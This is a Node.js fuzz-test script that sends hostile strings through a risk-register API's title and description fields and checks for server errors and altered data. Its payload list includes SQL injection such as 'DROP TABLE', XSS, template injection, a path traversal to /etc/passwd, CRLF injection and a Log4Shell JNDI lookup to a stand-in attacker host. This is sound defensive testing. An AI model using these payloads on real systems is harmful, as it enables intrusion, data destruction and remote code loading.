#!/usr/bin/env node
// Fills the gap ZAP left: its generated risks used out-of-range scores, so validation refused them before any
// payload in the text fields reached the database. Here the other fields are valid and only the text is hostile.
// Expect 201 or 400 (never 500), and anything stored must come back exactly as sent. Run against the isolated copy.
const G = process.env.GATEWAY_URL ?? 'http://gateway:8080';
const token = (await (await fetch(`${G}/api/auth/login`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username: 'alice', password: 'demo123' }) })).json()).accessToken;
const send = (method, path, body) => fetch(G + path, { method, headers: { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' }, body: JSON.stringify(body) });

const payloads = [
  "' OR '1'='1", "'; DROP TABLE risk; --", "\" OR 1=1 --", "1; SELECT pg_sleep(5)--", "$1$$; select 1; $$",
  '{"$gt": ""}', '{{7*7}}', '${7*7}', '#{7*7}', '<%= 7*7 %>', '${jndi:ldap://evil.example/a}',
  '<script>alert(1)</script>', '"><img src=x onerror=alert(1)>', 'javascript:alert(1)',
  '../../../../etc/passwd', '%00', '\\u0000', 'a\r\nX-Injected: 1', '‮gnp.exe', '😀'.repeat(50), 'ق'.repeat(150),
  'A'.repeat(200), 'A'.repeat(201), ' ', '', '\t\n', '\\', '\\\\"', String.fromCharCode(1, 2, 3, 27), '￿￾', '\uD800',
];

const outcomes = { stored: 0, refused: 0 };
const problems = [];
let id = null;
for (const p of payloads) {
  await new Promise((resolve) => setTimeout(resolve, 250)); // stay under the Gateway's 20 requests/s
  const body = { title: p, description: p, category: 'CYBER', likelihood: 3, impact: 3 };
  const r = await send('POST', '/api/risks', body);
  const json = await r.json().catch(() => null);
  if (r.status >= 500) problems.push(`create ${JSON.stringify(p).slice(0, 40)} → ${r.status}`);
  if (r.status === 201) {
    outcomes.stored++;
    id = json.id;
    const back = await (await fetch(`${G}/api/risks/${id}`, { headers: { Authorization: `Bearer ${token}` } })).json();
    if (back.title !== p || back.description !== p) problems.push(`changed on the way: ${JSON.stringify(p).slice(0, 40)}`);
    const u = await send('PUT', `/api/risks/${id}`, { ...body, title: `${p} (edited)`, version: back.version });
    if (u.status >= 500) problems.push(`update ${JSON.stringify(p).slice(0, 40)} → ${u.status}`);
  } else if (r.status === 400) {
    outcomes.refused++;
  } else if (r.status < 500) {
    problems.push(`create ${JSON.stringify(p).slice(0, 40)} → unexpected ${r.status}`);
  }
}
console.log(`${payloads.length} payloads: ${outcomes.stored} stored exactly as sent, ${outcomes.refused} refused with 400`);
console.log(problems.length ? `PROBLEMS:\n  ${problems.join('\n  ')}` : 'no server errors, nothing altered');
